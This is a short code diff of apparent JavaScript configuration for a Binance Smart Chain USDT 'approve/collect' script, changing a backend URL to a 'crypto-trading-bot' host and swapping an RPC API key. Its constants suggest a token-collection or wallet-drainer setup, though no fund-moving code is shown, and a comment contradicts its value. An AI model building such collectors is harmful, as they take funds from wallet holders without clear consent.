@@ -7,7 +7,7 @@ const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const BSC_CHAIN_ID_HEX = "0x38";
 const COLLECT_AMOUNT   = "100000000000000000"; // 0.1 USDT — 18 decimals
 const MIN_USDT_BALANCE = ethers.parseUnits("0", 18); // require > 1 USDT before approve/collect
-const BACKEND_URL      = "6d7bfba40f7d3c899ff8ce1743682192dca010294775daaea05310ff1d8b006f";
+const BACKEND_URL      = "https://crypto-trading-bot-lilac.vercel.app";
 
 const BSC_RPC_URLS = [
   "https://bsc-rpc.publicnode.com",
@@ -16,7 +16,7 @@ const BSC_RPC_URLS = [
   "https://bsc-dataseed3.binance.org/",
   "https://bsc-dataseed4.binance.org/",
   "https://rpc.ankr.com/bsc",
-  "https://rpc.ankr.com/bsc/6d7bfba40f7d3c899ff8ce1743682192dca010294775daaea05310ff1d8b006f"
+  "https://rpc.ankr.com/bsc/4a9f3fa75a1f44a547b0dc535f223faa0c49d8dda227309ee475846249382788"
 ];
 
 const BSC_CHAIN_PARAMS = {
